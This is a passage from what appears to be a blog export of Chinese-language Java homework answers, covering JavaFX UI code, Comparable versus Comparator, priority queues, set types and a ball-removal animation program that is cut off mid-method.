        <span class="token class-name">HBox</span> hb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HBox</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        hb<span class="token punctuation">.</span><span class="token function">setAlignment</span><span class="token punctuation">(</span><span class="token class-name">Pos</span><span class="token punctuation">.</span><span class="token constant">CENTER</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        hb<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Label</span><span class="token punctuation">(</span><span class="token string">"Selection Mode"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> cbMode<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">VBox</span> pane <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">VBox</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        pane<span class="token punctuation">.</span><span class="token function">setPrefSize</span><span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        pane<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>hb<span class="token punctuation">,</span> lvCountry<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//组合框的功能实现</span>
        cbMode<span class="token punctuation">.</span><span class="token function">setOnAction</span><span class="token punctuation">(</span>e <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token class-name">String</span> str <span class="token operator">=</span> cbMode<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getText</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"SINGLE"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">{</span>
                lvCountry<span class="token punctuation">.</span><span class="token function">getSelectionModel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setSelectionMode</span><span class="token punctuation">(</span><span class="token class-name">SelectionMode</span><span class="token punctuation">.</span><span class="token constant">SINGLE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"MULTIPLE"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">{</span>
                lvCountry<span class="token punctuation">.</span><span class="token function">getSelectionModel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setSelectionMode</span><span class="token punctuation">(</span><span class="token class-name">SelectionMode</span><span class="token punctuation">.</span><span class="token constant">MULTIPLE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Scene</span> scene <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scene</span><span class="token punctuation">(</span>pane<span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">setTitle</span><span class="token punctuation">(</span><span class="token string">"ComboBoxAndListView"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">setScene</span><span class="token punctuation">(</span>scene<span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="修改程序清单16-14-增加一个滑动条让用户可以为视频设置当前时间增加一个标签显示当前时间和视频的整体时间-整个时间是5分钟03秒当前时间是3分58秒-当播放视频时滑条值和当前时间持续更新"><a class="markdownIt-Anchor" href="#修改程序清单16-14-增加一个滑动条让用户可以为视频设置当前时间增加一个标签显示当前时间和视频的整体时间-整个时间是5分钟03秒当前时间是3分58秒-当播放视频时滑条值和当前时间持续更新"></a> (修改程序清单16-14) 增加一个滑动条让用户可以为视频设置当前时间，增加一个标签显示当前时间和视频的整体时间。整个时间是5分钟03秒，当前时间是3分58秒。当播放视频时，滑条值和当前时间持续更新</h2>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>作业</tag>
      </tags>
  </entry>
  <entry>
    <title>Java作业-9</title>
    <url>/2023/11/16/11-17-45/</url>
    <content><![CDATA[<p>JavaFX,文本处理</p>
<span id="more"></span>
<h2 id="comparable接口与comparator接口之间有什么不同指出他们分别属于哪一个包"><a class="markdownIt-Anchor" href="#comparable接口与comparator接口之间有什么不同指出他们分别属于哪一个包"></a> Comparable接口与Comparator接口之间有什么不同指出？他们分别属于哪一个包？</h2>
<table>
<thead>
<tr>
<th>特征/接口</th>
<th>Comparable</th>
<th>Comparator</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>定义</strong></td>
<td>用于定义对象的自然排序顺序。实现此接口的类可以自动排序。</td>
<td>用于定义两个对象间的比较规则。允许为类定义多种排序规则。</td>
</tr>
<tr>
<td><strong>方法</strong></td>
<td>只有一个方法：<code>compareTo(T o)</code>。</td>
<td>主要方法：<code>compare(T o1, T o2)</code>。还有其他辅助方法，如<code>reversed()</code>、<code>thenComparing()</code>等。</td>
</tr>
<tr>
<td><strong>使用场景</strong></td>
<td>类有明确的“自然”排序顺序时使用，如数字、字母顺序。</td>
<td>为某个类定义不同的排序规则，或该类没有自然排序且不希望或无法修改原始类。</td>
</tr>
<tr>
<td><strong>所在包</strong></td>
<td><code>java.lang</code></td>
<td><code>java.util</code></td>
</tr>
</tbody>
</table>
<h2 id="如何创建一个整数优先队列默认情况下元素如何以优先队列排序在优先队列中拥有最小数值的元素会被赋予最高优先级吗"><a class="markdownIt-Anchor" href="#如何创建一个整数优先队列默认情况下元素如何以优先队列排序在优先队列中拥有最小数值的元素会被赋予最高优先级吗"></a> 如何创建一个整数优先队列？默认情况下，元素如何以优先队列排序？在优先队列中，拥有最小数值的元素会被赋予最高优先级吗？</h2>
<p><code>PriorityQueue&lt;Integer&gt; priorityQueue = new PriorityQueue&lt;&gt;();</code><br>
如果元素类实现了Comparable接口，队列就会根据compareTo方法定义的自然顺序对元素进行排序。<br>
最小数值的元素会被赋予最高优先级</p>
<h2 id="如何创建一个将元素的自然顺序颠倒的优先队列"><a class="markdownIt-Anchor" href="#如何创建一个将元素的自然顺序颠倒的优先队列"></a> 如何创建一个将元素的自然顺序颠倒的优先队列？</h2>
<p>在构造函数中传递一个自定义的Comparator对象</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ReverseOrderPriorityQueue</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// 创建一个Comparator，颠倒自然顺序</span>
        <span class="token class-name">Comparator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> reverseOrder <span class="token operator">=</span> <span class="token punctuation">(</span>o1<span class="token punctuation">,</span> o2<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> o2<span class="token punctuation">.</span><span class="token function">compareTo</span><span class="token punctuation">(</span>o1<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 使用自定义Comparator创建PriorityQueue</span>
        <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> priorityQueue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span>reverseOrder<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 添加一些元素进行测试</span>
        priorityQueue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        priorityQueue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        priorityQueue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        priorityQueue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 循环并删除队列中的每个元素</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>priorityQueue<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>priorityQueue<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="hashset-linkhashset和treeset之间的区别是什么"><a class="markdownIt-Anchor" href="#hashset-linkhashset和treeset之间的区别是什么"></a> HashSet、LinkHashSet和TreeSet之间的区别是什么？</h2>
<table>
<thead>
<tr>
<th>特性</th>
<th>HashSet</th>
<th>LinkedHashSet</th>
<th>TreeSet</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>内部数据结构</strong></td>
<td>基于哈希表（HashMap实例）</td>
<td>基于哈希表和双向链表</td>
<td>基于红黑树（自平衡的二叉搜索树）</td>
</tr>
<tr>
<td><strong>顺序性</strong></td>
<td>无序</td>
<td>维护插入顺序</td>
<td>按自然排序或指定的Comparator排序</td>
</tr>
<tr>
<td><strong>性能</strong></td>
<td>增删查操作通常是 O(1)</td>
<td>增删查操作通常是 O(1)，但略慢于HashSet</td>
<td>增删查操作大约是 O(log n)</td>
</tr>
<tr>
<td><strong>使用场景</strong></td>
<td>不需要维护元素顺序的快速查找、插入和删除</td>
<td>需要维护元素插入顺序的快速查找、插入和删除</td>
<td>需要按顺序存储元素的情况</td>
</tr>
<tr>
<td><strong>所在包</strong></td>
<td>java.util.HashSet</td>
<td>java.util.LinkedHashSet</td>
<td>java.util.TreeSet</td>
</tr>
</tbody>
</table>
<h2 id="替换输出是"><a class="markdownIt-Anchor" href="#替换输出是"></a> 替换，输出是？</h2>
<p>A sorted set of geometric objects<br>
area = 20.0<br>
area = 4.0<br>
area = 5021.538</p>
<h2 id="合适的数据结构"><a class="markdownIt-Anchor" href="#合适的数据结构"></a> 合适的数据结构</h2>
<p>21.10 Set或HashSet<br>
21.11 LinkedHashSet<br>
21.12 TreeSet<br>
21.13 普通数组 a[10]<br>
21.14 ArrayList<br>
21.15 LinkedList</p>
<h2 id="修改程序清单20-6使得一个球在被创建的时候赋给一个2~20的随机半径-当单击-按钮时最大的一个球被移除"><a class="markdownIt-Anchor" href="#修改程序清单20-6使得一个球在被创建的时候赋给一个2~20的随机半径-当单击-按钮时最大的一个球被移除"></a> 修改程序清单20-6，使得一个球在被创建的时候赋给一个2~20的随机半径。当单击“-”按钮时，最大的一个球被移除</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>animation<span class="token punctuation">.</span></span><span class="token class-name">KeyFrame</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>animation<span class="token punctuation">.</span></span><span class="token class-name">Timeline</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>application<span class="token punctuation">.</span></span><span class="token class-name">Application</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>beans<span class="token punctuation">.</span>property<span class="token punctuation">.</span></span><span class="token class-name">DoubleProperty</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>geometry<span class="token punctuation">.</span></span><span class="token class-name">Pos</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span></span><span class="token class-name">Node</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span></span><span class="token class-name">Scene</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>control<span class="token punctuation">.</span></span><span class="token class-name">Button</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>control<span class="token punctuation">.</span></span><span class="token class-name">ScrollBar</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>layout<span class="token punctuation">.</span></span><span class="token class-name">BorderPane</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>layout<span class="token punctuation">.</span></span><span class="token class-name">HBox</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>layout<span class="token punctuation">.</span></span><span class="token class-name">Pane</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>paint<span class="token punctuation">.</span></span><span class="token class-name">Color</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>shape<span class="token punctuation">.</span></span><span class="token class-name">Circle</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>stage<span class="token punctuation">.</span></span><span class="token class-name">Stage</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Duration</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BallRemover</span> <span class="token keyword">extends</span> <span class="token class-name">Application</span> <span class="token punctuation">{</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token class-name">Stage</span> primaryStage<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// 创建包含多个球的面板</span>
        <span class="token class-name">MultipleBallPane</span> ballPane <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MultipleBallPane</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ballPane<span class="token punctuation">.</span><span class="token function">setStyle</span><span class="token punctuation">(</span><span class="token string">"-fx-border-color: #abcdef"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 创建添加和减少球体的按钮</span>
        <span class="token class-name">Button</span> btAdd <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Button</span><span class="token punctuation">(</span><span class="token string">"+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Button</span> btSubtract <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Button</span><span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">HBox</span> hBox <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HBox</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        hBox<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>btAdd<span class="token punctuation">,</span> btSubtract<span class="token punctuation">)</span><span class="token punctuation">;</span>
        hBox<span class="token punctuation">.</span><span class="token function">setAlignment</span><span class="token punctuation">(</span><span class="token class-name">Pos</span><span class="token punctuation">.</span><span class="token constant">CENTER</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 设置按钮的事件处理</span>
        btAdd<span class="token punctuation">.</span><span class="token function">setOnAction</span><span class="token punctuation">(</span>e <span class="token operator">-&gt;</span> ballPane<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        btSubtract<span class="token punctuation">.</span><span class="token function">setOnAction</span><span class="token punctuation">(</span>e <span class="token operator">-&gt;</span> ballPane<span class="token punctuation">.</span><span class="token function">subtract</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 暂停和恢复动画的事件处理</span>
        ballPane<span class="token punctuation">.</span><span class="token function">setOnMousePressed</span><span class="token punctuation">(</span>e <span class="token operator">-&gt;</span> ballPane<span class="token punctuation">.</span><span class="token function">pause</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ballPane<span class="token punctuation">.</span><span class="token function">setOnMouseReleased</span><span class="token punctuation">(</span>e <span class="token operator">-&gt;</span> ballPane<span class="token punctuation">.</span><span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 创建并设置滚动条以控制动画速度</span>
        <span class="token class-name">ScrollBar</span> sbSpeed <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ScrollBar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        sbSpeed<span class="token punctuation">.</span><span class="token function">setMax</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        sbSpeed<span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ballPane<span class="token punctuation">.</span><span class="token function">rateProperty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span>sbSpeed<span class="token punctuation">.</span><span class="token function">valueProperty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 设置面板布局</span>
        <span class="token class-name">BorderPane</span> pane <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BorderPane</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        pane<span class="token punctuation">.</span><span class="token function">setCenter</span><span class="token punctuation">(</span>ballPane<span class="token punctuation">)</span><span class="token punctuation">;</span>
        pane<span class="token punctuation">.</span><span class="token function">setTop</span><span class="token punctuation">(</span>sbSpeed<span class="token punctuation">)</span><span class="token punctuation">;</span>
        pane<span class="token punctuation">.</span><span class="token function">setBottom</span><span class="token punctuation">(</span>hBox<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 创建和设置场景</span>
        <span class="token class-name">Scene</span> scene <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scene</span><span class="token punctuation">(</span>pane<span class="token punctuation">,</span> <span class="token number">250</span><span class="token punctuation">,</span> <span class="token number">150</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">setTitle</span><span class="token punctuation">(</span><span class="token string">"BallRemover"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">setScene</span><span class="token punctuation">(</span>scene<span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">class</span> <span class="token class-name">MultipleBallPane</span> <span class="token keyword">extends</span> <span class="token class-name">Pane</span> <span class="token punctuation">{</span>
        <span class="token keyword">private</span> <span class="token class-name">Timeline</span> animation<span class="token punctuation">;</span>

        <span class="token keyword">public</span> <span class="token class-name">MultipleBallPane</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// 初始化动画</span>
            animation <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Timeline</span><span class="token punctuation">(</span>
                    <span class="token keyword">new</span> <span class="token class-name">KeyFrame</span><span class="token punctuation">(</span><span class="token class-name">Duration</span><span class="token punctuation">.</span><span class="token function">millis</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">,</span> e <span class="token operator">-&gt;</span> <span class="token function">moveBall</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            animation<span class="token punctuation">.</span><span class="token function">setCycleCount</span><span class="token punctuation">(</span><span class="token class-name">Timeline</span><span class="token punctuation">.</span><span class="token constant">INDEFINITE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            animation<span class="token punctuation">.</span><span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 启动动画</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// 随机创建一个新球并添加到面板中</span>
            <span class="token class-name">Color</span> color <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Color</span><span class="token punctuation">(</span><span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0.5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Ball</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">16</span> <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">,</span> color<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">subtract</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token comment">// 移除最大的球</span>
                <span class="token class-name">Ball</span> largestBall <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Ball</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Node</span> node <span class="token operator">:</span> <span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token class-name">Ball</span> ball <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Ball</span><span class="token punctuation">)</span> node<span class="token punctuation">;</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>ball<span class="token punctuation">.</span><span class="token function">getRadius</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> largestBall<span class="token punctuation">.</span><span class="token function">getRadius</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        largestBall <span class="token operator">=</span> ball<span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span>
                <span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>largestBall<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>

        <span class="token comment">// 控制动画的播放和暂停</span>
        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            animation<span class="token punctuation">.</span><span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">pause</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            animation<span class="token punctuation">.</span><span class="token function">pause</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token comment">// 获取动画速度的属性</span>
        <span class="token keyword">public</span> <span class="token class-name">DoubleProperty</span> <span class="token function">rateProperty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> animation<span class="token punctuation">.</span><span class="token function">rateProperty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token comment">// 移动场景中的所有球</span>
        <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">moveBall</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Node</span> node <span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token class-name">Ball</span> ball <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Ball</span><span class="token punctuation">)</span> node<span class="token punctuation">;</span>
                <span class="token comment">// 检查球是否触碰到边界</span>
